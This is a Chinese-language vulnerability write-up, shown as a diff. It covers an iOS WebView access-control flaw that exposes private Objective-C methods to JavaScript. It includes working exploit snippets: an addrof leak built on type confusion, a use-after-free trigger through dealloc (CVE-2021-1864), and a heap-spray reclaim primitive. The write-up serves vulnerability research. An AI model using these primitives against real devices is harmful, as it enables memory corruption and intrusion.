@@ -1,0 +1,105 @@
+**作者：0xcc  
+原文链接：**
+上一篇介绍了一个[在 iOS 藏了十一年的客户端 XSS](https://paper.seebug.org/1659/)。在这个特殊的 WebView
+环境中，系统将 SUScriptInterface 类下的方法导出到全局上下文中的 iTunes 命名空间，从而让 JavaScript 可以通过
+WebScripting API 调用其中的方法。
+这个机制和 Android 上的 addJavaScriptInterface 非常相似，而后者出过很严重的安全问题，即 js 可以使用反射调用到任意的
+native 方法，从而远程执行代码。修复的方案是加上一个 @JavascriptInterace
+注解来限制可访问的方法。可以看到这里的访问控制起到了很重要的作用。
+然而 iOS 上犯了一个类似的错误，一直藏到了 2020 年。
+与 Android 不同，WebScripting 其实从一开始就考虑了访问控制。文档里明确写道，注入到 js 的对象需要实现
+isSelectorExcludedFromWebScript: 方法来判断某个 selector 是否允许调用。默认情况下 -[NSObject
+isSelectorExcludedFromWebScript:] 返回 YES，也就是禁止一切调用。开发者根据需要，有选择地放行。
+虽然文档是这么写，实际上到了代码又是另一回事了。这个只有两条指令的方法从 iOS 6 就一直返回 NO，允许任意方法调用：
+    bool +[SUScriptObject isSelectorExcludedFromWebScript:](id, SEL, SEL)
+      MOV             W0, #0
+      RET
+让我们来看看这只蝴蝶能掀起多大的风浪。
+### 对象地址泄漏
+在 Objective-C 里的方法就是给对象发送消息，其独特的语法最后会被编译器翻译成各种 objc_msgSend
+函数的调用。如果给一个对象发送了一个不存在的 selector（方法名），运行时就会抛出异常，输出类似如下的错误信息：
+unrecognized selector sent to instance 0x10b15a470
+其中的指针一般就是 SELF 对象的堆地址。
+回到 SUScriptInterface 这个类。在 js 里访问 iTunes.window 会走到 -[SUScriptInterface
+window] 方法，方法的内部会调用一次 SELF.scriptWindowContext 的 tag 方法。
+由于前面提到，iTunes 的业务逻辑并没有限制 js 调用方法的范围，因此这个私有属性的 setter 方法
+setScriptWindowContext_ 也可以被调用到。这样以来就可以通过 js 把对应的属性替换成一个不合法的类型，造成 Objective-C
+的类型混淆。
+接着用 js 访问 iTunes.window 就会抛出一个 NSException。在这个 WebScripting 环境中，Objective-C
+的异常可以被 js 的 catch 语句捕获。这时候异常的文本内容就带上了我们赋值上去的对象的地址，格式化成十六进制。
+    function addrof(obj) {
+      const saved = iTunes.scriptWindowContext()
+      iTunes.setScriptWindowContext_(obj)
+      try {
+        iTunes.window
+      } catch(e) {
+        console.debug(e)
+        const match = /instance (0x[\da-f]+)$/i.exec(e)
+        if (match) return match[1]
+        throw new Error('Unable to leak heap addr')
+      } finally {
+        iTunes.setScriptWindowContext_(saved)
+      }
+    }
+    // usage:
+    addrof(iTunes.makeWindow())
+    addrof('A'.repeat(1024 * 1024))
+马上得到了 addrof 原语。首先篡改私有对象属性造成类型混淆，捕获异常然后解析一下文本就可以了。
+Objective-C 里还直接用指针保存内联信息（如字符串、数字、日期等类型），这个 addrof 原语同样适用于 tagged pointer。
+### 泄漏 dyld_shared_cache 基地址
+iOS 当中所有的系统自带的动态链接库都共享一个随机化偏移，只要泄漏任意一个 library 的基址就可以获取剩下全部。刚才的 addrof 除了能泄露
+heap 上对象的地址，针对特定的对象还可以泄露库的基地址。
+在 Objective-C 运行时里，一些特殊的 magic value 并不会产生新的内存分配，而是用特定的符号指针表示。部分 Objective-C
+的符号和 js 特殊值对应关系如下：
+__kCFNumberNaN | NaN  
+---|---  
+__kCFNumberPositiveInfinity | Infinity  
+__kCFBooleanTrue | true  
+__kCFBooleanFalse | false  
+泄露以上任意一个 js 值的地址就可以获得左边符号的地址，从而得到 CoreFoundation 和其他任意 framework
+的地址。当然，由于目前还没有内存读，这种方式需要根据版本适配偏移量。也可以结合其他 jsc 的漏洞做符号解析，实现更优雅的利用。
+### 释放后重用
+关键的漏洞登场了。由于访问控制简单地将所有的方法导出给 js，一些与对象生命周期相关的方法也暴露了。
+在对象上有一个很特殊，正常情况下不会用到的方法 dealloc。在
+ARC（自动对象引用）之前有一段痛苦的时期需要开发者手工管理对象内存分配。Objective-C 使用引用计数，在释放一个对象时需要调用其 release
+方法减少一个引用。当引用计数为 0 时，就会走到 dealloc 方法真正地释放内存。
+无论是之前的手动挡 MRC 还是自动挡 ARC，都不会主动用到 dealloc 这个方法。然而现在 js
+可以动态调用这个方法，直接把变量对应的对象销毁掉，造成 Use-After-Free。
+    const w = iTunes.makeWindow();
+    w.dealloc();
+    w // dangling reference
+以上代码先用 makeWindow 创建了一个新的 SUScriptWindow 对象，然后直接释放掉了。但 js
+层还保留着原先的地址引用，尝试访问这个变量就会在 objc_opt_respondsToSelector 上造成一个无效的指针解引用。
+这个漏洞的 id 是 CVE-2021-1864，但它从 iOS 6 就被引入了。
+### 内存占位
+通常对 UAF 漏洞的利用多是在对象释放后抢占分配一个大小一致、结构不同的对象来造成类型混淆。
+在这个环境里很容易想到用 iTunes.make* 系列函数可以分配不同的对象。然而事实是，由于这些对象都以 SUScriptObject
+为基类，类型混淆之后不能造成严重的副作用。
+参考之前的文献，如 Modern Objective-C Exploitation 和 Project Zero 的 iMessage 远程攻击，都利用到了
+objc_msgSend 的相关特性，在对象的 isa 指针上大作文章。
+isa 指针是对象的第一个成员，要想能构建出自定义的值，占位的对象需要满足长度可控和内容可控，一段连续存储的 buffer 是可靠的候选。是不是用 js
+里的 ArrayBuffer 或者字符串就行了？之前也提到 WebScripting 会自动把 js 的字符串转换成 NSString。
+然而现实很骨感，JavaScriptCore 用的堆和被释放的对象所在的堆不是同一个。至于 JavaScriptCore 创建出来的
+NSString，只是保存了一个指针，具体的字符串内容还是在 jsc 自己的堆里，所以这种方式也不能在 Objective-C 的堆上造成长度可控的分配。
+最后找到了一个很巧妙的函数 -[SUScriptFacebookRequest
+addmultipartdata:withName:type:]。第一个参数是一个 URL 字符串，当传入一个 data URI 时，就会调用
+SUGetDataForDataURL 将其解码成一个 NSData 对象并添加到 SUScriptFacebookRequest 实例上。Data URI
+支持用 base64 编码二进制的内容，而生成的 NSData 正好会在 Objective-C
+的堆上产生一次长度、内容完全可控的分配。这就形成了一个完美的内存占位原语。
+    // alloc an SUScriptXMLHTTPStoreRequest
+    const w = iTunes.makeXMLHTTPStoreRequest();
+    const req = iTunes.createFacebookRequest('http://', 'GET');
+    // malloc_size(SUScriptXMLHTTPStoreRequest) == 192
+    const uri = str2DataUri(makeStr(192));
+    // avoid GC
+    window.w = w; window.req = req;
+    // get a dangling pointer
+    w.dealloc();
+    for (let i = 0; i < 32; i++)
+      req.addMultiPartData(uri, 'A', 'B');
+    w // boom
+用以上代码将被释放的对象重新用 0x41 填充，再次引用这个变量时结果如下：
+接下来可以继续构造 fakeobj 原语进行下一步利用了。面前的一大挑战是 PAC，接下来应该如何利用？我们下一篇文章见。
+从一个访问控制的方法开始，一共就两行指令的问题接连导致了类型混淆、信息泄漏和释放后重用。有趣的是在官方文档上明明白白写了直接放行会产生安全问题，仍然引入了
+bug。也许是开发之初就认为这个环境不会执行第三方脚本，因此不需要严格遵守安全规范。侥幸心理是行不通的。
+* * *
